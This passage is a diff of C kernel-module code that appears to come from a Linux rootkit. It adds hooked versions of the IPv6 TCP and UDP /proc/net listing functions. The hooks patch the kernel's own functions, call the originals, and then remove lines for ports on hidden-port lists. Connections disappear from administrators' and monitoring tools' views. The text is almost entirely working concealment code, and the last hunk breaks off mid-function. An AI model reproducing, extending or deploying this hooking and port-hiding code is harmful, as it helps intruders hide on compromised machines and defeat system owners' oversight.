@@ -698,6 +698,36 @@ static int n_tcp4_seq_show ( struct seq_file *seq, void *v)
     return ret;
 }
 
+static int n_tcp6_seq_show ( struct seq_file *seq, void *v )
+{
+    int ret;
+    char port[12];
+    struct hidden_port *hp;
+/*
+    hijack_pause(tcp6_seq_show);
+    ret = tcp6_seq_show(seq, v);
+    hijack_resume(tcp6_seq_show);
+*/
+	
+    int (*original_tcp6_seq_show)(struct seq_file *, void *);
+    original_tcp6_seq_show = asm_hook_unpatch(n_tcp6_seq_show);
+    ret = original_tcp6_seq_show(seq, v);
+    asm_hook_patch(n_tcp6_seq_show);
+
+    list_for_each_entry ( hp, &hidden_tcp6_ports, list )
+    {
+        sprintf(port, ":%04X", hp->port);
+
+        if ( strnstr(seq->buf + seq->count - TMPSZ, port, TMPSZ) )
+        {
+            seq->count -= TMPSZ;
+            break;
+        }
+    }
+
+    return ret;
+}
+
 static int n_udp4_seq_show ( struct seq_file *seq, void *v )
 {
     int ret;
@@ -714,6 +744,36 @@ static int n_udp4_seq_show ( struct seq_file *seq, void *v )
     asm_hook_patch(n_udp4_seq_show);
 
     list_for_each_entry ( hp, &hidden_udp4_ports, list )
+    {
+        sprintf(port, ":%04X", hp->port);
+
+        if ( strnstr(seq->buf + seq->count - TMPSZ, port, TMPSZ) )
+        {
+            seq->count -= TMPSZ;
+            break;
+        }
+    }
+
+    return ret;
+}
+
+static int n_udp6_seq_show ( struct seq_file *seq, void *v )
+{
+    int ret;
+    char port[12];
+    struct hidden_port *hp;
+/*
+    hijack_pause(udp6_seq_show);
+    ret = udp6_seq_show(seq, v);
+    hijack_resume(udp6_seq_show);
+	
+    */
+    int (*original_udp6_seq_show)(struct seq_file *, void *);
+    original_udp6_seq_show = asm_hook_unpatch(n_udp6_seq_show);
+    ret = original_udp6_seq_show(seq, v);
+    asm_hook_patch(n_udp6_seq_show);
+
+    list_for_each_entry ( hp, &hidden_udp6_ports, list )
     {
         sprintf(port, ":%04X", hp->port);
 
